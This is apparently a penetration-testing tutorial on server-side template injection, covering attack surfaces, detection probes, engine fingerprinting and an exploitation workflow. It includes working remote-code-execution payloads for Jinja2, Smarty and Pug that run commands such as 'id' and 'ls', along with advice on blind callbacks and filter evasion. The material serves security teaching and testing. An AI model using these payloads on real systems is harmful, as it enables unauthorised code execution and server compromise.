# Server‑Side Template Injection (SSTI)

## what SSTI is and why it matters : 
SSTI occurs when user input is passed into a server‑side template engine without proper sanitization, allowing the attacker to inject template syntax that the server evaluates. Unlike XSS (which runs in the victim’s browser), SSTI runs on the server and can lead to remote code execution (RCE), data theft, and full system compromise if the template engine exposes powerful objects/APIs.

Core idea:
- Template engines take a template (HTML/text with placeholders) and render it using a context object.
- If attacker input becomes part of that template or context, the engine may evaluate it as code.
- Impact depends on the engine and which objects/functions are reachable from templates.

Common engines and risk levels:
- Jinja2 (Python) — high risk, often allows object traversal to builtins.
- Twig / Smarty (PHP) — varying risk; code execution is possible in some setups.
- Pug/Jade (Node) — server‑side Node context can expose child_process.
- Others (Mustache, ERB, etc.) — behavior differs; some are safer because they don't evaluate expressions.

---

##  where to look (real‑world surfaces)
- Search boxes and result pages (queries rendered back into templates)  
- User profile fields (name, bio) that are rendered in server templates  
- Contact/support forms (content used in notification templates, emails)  
- Preview/render endpoints: `/preview`, `/render`, `/template`, `/mail`  
- Error pages and debug views that print request data  
- Uploads that are rendered (custom HTML/XML/PDF generators)  
- Admin/backoffice renderers and email templates (high value for blind/server impact)

When testing, prefer fields that are later processed server‑side (stored or used in rendering), not just reflected client‑side.

---

## Detection — quick checks and probe payloads
Start with harmless probes that reveal evaluation or errors.

Generic probes (try all variations):
- `{7*7}` or `{{7*7}}`  
- `{{7*'7'}}`  
- `${7*7}`, `<%= 7*7 %>`, `#{7*7}`

How to interpret results:
- If the response shows a computed result (e.g., `49`) or an engine error referencing template internals, you likely have SSTI.
- If input is echoed literally (no evaluation), try other engine syntaxes or different injection points.

Engine fingerprinting probes (common):

- Jinja2 (Python): `{{7*7}}` -> `49` or `{{config.items()}}` errors
- Twig (PHP): `{{7*7}}` -> `49` (Twig syntax overlaps; confirm with Twig‑specific chains)
- Smarty (PHP): `{$var|upper}` style; `{'hello'|upper}` -> `HELLO`
- Pug/Jade (Node): `#{7*7}` -> `49`

If a probe causes a template error that leaks stack or object names, use that to guide the next steps.

---

## Exploitation — step‑by‑step workflow :

1. Recon: confirm injection and engine
   - Submit a few probe payloads (engine variants) and capture responses.
   - Use timing, errors, and output to identify the engine and context (HTML, attribute, URL, JSON).

2. Map the template context
   - Find out what variables are available and whether input is used directly as template source or as a variable value.
   - Test small expressions that access attributes like `.__class__`, `.items()`, `.upper()` to see exposed objects.

3. Try safe information‑gathering
   - Read environment identifiers first (non‑destructive):
     - Jinja2 example: `{{config}}` or `{{''.__class__.__mro__[1].__subclasses__()[:5]}}` to list classes (use carefully).
     - Twig/Smarty: attempt harmless function calls or see error output that reveals functions.
   - Goal: confirm server language and reachable objects without running system commands.

4. Escalate to command execution only after confirming context
   - Jinja2 (Python) RCE pattern (conceptual): traverse to builtin import and call subprocess to run commands:
     - Example idea (compact): use `__mro__` → `__subclasses__()` → find Popen/subprocess classes → call `check_output(...)`.
     - Exact payloads vary; use minimal command like `id` or `ls` to prove code execution.
   - Twig (PHP): search for exposed PHP functions (e.g., `system`) or object chains that allow calling functions.
   - Pug/Jade (Node): traverse to `process.mainModule.require('child_process')` and run `execSync`/`spawnSync`.

5. Proof‑of‑impact (non‑destructive)
   - Prefer reading a file with low risk (e.g., application version file) rather than altering system state.
   - Collect evidence: command output shown in response, or outbound HTTP callback to a collector you control (for blind cases).

6. Cleanup and documentation
   - Record exact payload, endpoint, HTTP request and response, timestamp, and any evidence (output or callbacks).
   - Do not leave persistent changes on target systems.

---

## Engine‑specific payload examples (detection → info → RCE ideas)
These are just example.. in real world thing will vary depends on version, path etc
Jinja2 (Python)
- Detect: `{{7*7}}` → `49`
- Probe objects: `{{''.__class__.__mro__[1].__subclasses__()}}` to enumerate classes
- RCE pattern idea (conceptual): find subprocess from subclasses and call `check_output(['id'])` to list user
  - Example (trimming and adapting required for real target): `{{''.__class__.__mro__[1].__subclasses__()[157]().__init__.__globals__['__builtins__']['__import__']('subprocess').check_output(['id'])}}`

Twig (PHP)
- Detect: `{{7*7}}` → `49`
- Probe: call filters or methods; look for functions exposed in template context
- RCE: harder directly; look for insecure use of `eval`/`include` with user input or PHP functions accessible in template context

Smarty (PHP)
- Detect: `{'hello'|upper}` → `HELLO`
- RCE: if PHP functions available, `{$smarty.server.PHP_SELF|@phpfunc:system('id')}` (engine and config dependent)

Pug / Jade (Node)
- Detect: `#{7*7}` → `49`
- RCE idea: access `process.mainModule.require('child_process').execSync('id').toString()`
  - Example concept: `#{root.process.mainModule.require('child_process').execSync('ls').toString()}`

---

## Real‑world attack scenarios (context + attack path)

1. Comment → Moderator dashboard (high impact)
   - Path: attacker posts comment with SSTI payload → moderator view renders comment using server template → payload evaluated in server context with moderator session / access to backend resources.
   - Why valuable: payload can run where higher privileges or internal tools are accessed.

2. Contact form → email/template rendering (blind SSTI)
   - Path: attacker submits payload in contact form → server uses the payload inside email templates rendered by backend (admin email previews). Execution may be blind; use external callback to detect.
   - Technique: seed payload that triggers an outbound request to your collector when the template is rendered.

3. Preview / render endpoints
   - Path: `/preview` that renders user‑submitted markdown / HTML using server templates can evaluate template syntax. Test preview endpoints thoroughly.

4. File/template upload + rendering
   - Path: uploaded template file gets rendered by server or included in a compiled report → payload executes when processed (batch jobs, PDF generation).

In each scenario, prioritize proof that shows template evaluation and the execution context (e.g., admin dashboard path, email template renderer, background worker).

---

## Detection & validation checklist (avoid false positives)
- Confirm evaluation (computed result or error), not just reflection of input.
- Fingerprint engine using multiple syntax variants to reduce guesswork.
- If you get a blind callback (HTTP to your collector), capture headers: `User-Agent`, `Referer`, and any path to identify the renderer.
- For RCE evidence, prefer non‑destructive commands and small outputs (e.g., read `/etc/hostname`, `id`, `ls /app`).
- Use separate test accounts where possible and avoid causing service outages.

---

## Evasion and sanitization considerations
- Filters may strip `<`/`>` or common template characters; try alternate encodings or engine‑specific encodings.
- If direct payloads are sanitized, try payload splitting or injecting into another variable that the template later uses inside an expression.
- Some engines escape by default; look for contexts where raw rendering is explicitly used (e.g., `|raw`, `|safe`, `|raw` filters, or `autoescape` disabled).

---
